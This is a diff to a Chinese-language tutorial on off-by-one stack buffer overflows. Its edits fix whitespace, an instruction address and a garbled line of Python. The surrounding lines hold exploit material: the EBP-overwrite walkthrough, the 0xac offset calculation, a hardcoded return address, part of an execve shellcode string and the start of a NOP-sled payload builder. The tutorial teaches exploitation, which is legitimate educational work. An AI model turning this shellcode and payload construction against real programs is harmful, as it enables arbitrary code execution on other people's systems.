@@ -153,7 +153,7 @@ $1 = 0x41414141
 我们先试着从 text 段地址0x0804840开始尝试理解CPU的执行：  
 
 0x08048490 - call strcpy – 执行这个指令会导致off-by-one溢出，因此（储存在栈地址0xbffff2cc中的）foo的EBP值将会由0xbffff2d8变为0xbffff200。  
-0x08048495 - leave - leave指令释放了这个函数的栈空间并且恢复了EBP。  
+0x08048495 - leave - leave指令释放了这个函数的栈空间并且恢复了EBP。    
 ```
 leave: mov ebp, esp;        //unwind stack space by setting esp to ebp. 
        pop ebp;             //restore ebp
@@ -162,15 +162,15 @@ leave: mov ebp, esp;        //esp = ebp = 0xbffff2cc
        pop ebp;             //ebp = 0xbffff200 (Overwritten EBP value is now stored in ebp register); esp = 0xbffff2d0
 ```
 
-0x08048495 - ret - 返回到foo的指令0x08048475。
-0x08048475 - leave - leave指令释放了这个函数的栈空间并且恢复了EBP。
+0x08048496 - ret - 返回到foo的指令0x08048475。  
+0x08048475 - leave - leave指令释放了这个函数的栈空间并且恢复了EBP。  
 ```
 *** As per our example: ***
 leave: mov ebp, esp;        //esp = ebp = 0xbffff200 (As part of unwinding esp is shifted down instead of up!!)
        pop ebp;             //ebp = 0x41414141; esp = 0xbffff204
 ```
 
-0x08048476 - ret - 返回到储存在ESP (0xbffff204)中的指令中。此时ESP指向被攻击者控制的缓冲区，因此攻击者可以回到任何他想要实现任意代码执行的地方。
+0x08048476 - ret - 返回到储存在ESP (0xbffff204)中的指令中。此时ESP指向被攻击者控制的缓冲区，因此攻击者可以回到任何他想要实现任意代码执行的地方。  
 
 现在我们回到“在目标缓冲区‘buf’中寻找返回地址的偏移量”的最初测试上。如堆栈布局图所示，‘buf’位于0xbffff158，并且由紧随其后的CPU执行中可知，目标缓冲区‘buf’内的返回地址位置是0xbffff204。因此目标缓冲区‘buf’中返回地址的偏移量是0xbffff204 – 0xbffff158 = 0xac，因此用户输入“A”172 + “B”4 + “A”*80，用“BBBB”覆盖了EIP。  
 
@@ -218,7 +218,7 @@ scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe
 ret_addr = 0xbffff218
 #endianess conversion
 def conv(num):
- return struct.pack("<I",numturn Address + NOP's + Shellcode + Junk
+ return struct.pack("<I",num)
 buf = "A" * 172
 buf += conv(ret_addr)
 buf += "\x90" * 30
